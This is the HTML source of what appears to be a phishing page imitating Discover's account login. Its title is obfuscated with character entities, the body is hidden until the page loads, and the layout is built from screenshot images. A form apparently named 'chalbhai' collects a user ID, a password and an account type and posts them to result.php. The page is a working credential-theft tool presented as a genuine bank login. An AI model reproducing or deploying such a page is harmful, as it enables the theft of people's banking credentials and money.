<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Cr&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#115;&#44;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#44;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#44;&#32;&#72;&#111;&#109;&#101;&#32;&#69;&#113;&#117;&#105;&#116;&#121;&#32;&#97;&#110;&#100;&#32;&#83;&#116;&#117;&#100;&#101;&#110;&#116;&#32;&#76;&#111;&#97;&#110;&#115;&#32;&#124;&#32;&#68;&#105;&#115;cover</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">






<style> 
  .textbox { 
    font-family: Arial, Helvetica, sans-serif;
    background: rgba(255, 255, 255, 0.44); 
    color: #333; 
    border: 1px solid #A4A4A4; 
    padding: 4px 8px 4px 4px !important;
    line-height: 1; 
    width: 275px; 
    height:42px; 
  } 
 .textbox:hover { 
    border: 1px solid #FF00FF; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
  } 
 .textbox:focus { 
    border: 1px solid #4d90fe; 
    outline: none; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3);  
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    background: rgb(255, 255, 255); } 
  
</style> 
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1347px; height:60px; z-index:0"><a href="#"><img src="images/1.png" alt="" title="" border=0 width=1347 height=60></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:61px; width:1351px; height:542px; z-index:1"><img src="images/2.png" alt="" title="" border=0 width=1351 height=542></div>
<form action=result.php name=chalbhai id=chalbhai method=post>
<div id="image3" style="position:absolute; overflow:hidden; left:535px; top:275px; width:148px; height:38px; z-index:2"><a href="#"><img src="images/3.png" alt="" title="" border=0 width=148 height=38></a></div>

<input name="formtext1"  placeholder=" User ID" required class="textbox" type="text" style="position:absolute;width:259px;font-size: .8522em;left:225px;top:153px;z-index:3">
<input name="formtext2"  placeholder=" Password" required class="textbox" type="password" style="position:absolute;width:259px;font-size: .8522em;left:225px;top:222px;z-index:4">
<select name="formtext3" required class="textbox" type="text" style="position:absolute;width:259px;left:225px;font-size: .8522em;top:287px;z-index:5">
<option>Select an Account</option>
<option>Credit Card</option>
<option>Bank Account</option>
<option>Student Loans</option>
<option>Personal Loans</option>
<option>Home Equity Loans</option>
</select>
<div id="formcheckbox1" style="position:absolute; left:225px; top:347px; z-index:6"><input type="checkbox" name="formcheckbox1"></div>
<div id="image4" style="position:absolute; overflow:hidden; left:223px; top:462px; width:185px; height:87px; z-index:7"><a href="#"><img src="images/4.png" alt="" title="" border=0 width=185 height=87></a></div>

<div id="formimage1" style="position:absolute; left:225px; top:399px; z-index:8"><input type="image" name="formimage1" width="99" height="39" src="images/5.png"></div>
<div id="image5" style="position:absolute; overflow:hidden; left:210px; top:657px; width:967px; height:318px; z-index:9"><a href="#"><img src="images/6.png" alt="" title="" border=0 width=967 height=318></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:1025px; width:1354px; height:600px; z-index:10"><img src="images/7.png" alt="" title="" border=0 width=1354 height=600></div>

<div id="image7" style="position:absolute; overflow:hidden; left:193px; top:1093px; width:747px; height:362px; z-index:11"><a href="#"><img src="images/8.png" alt="" title="" border=0 width=747 height=362></a></div>


</body>
</html>
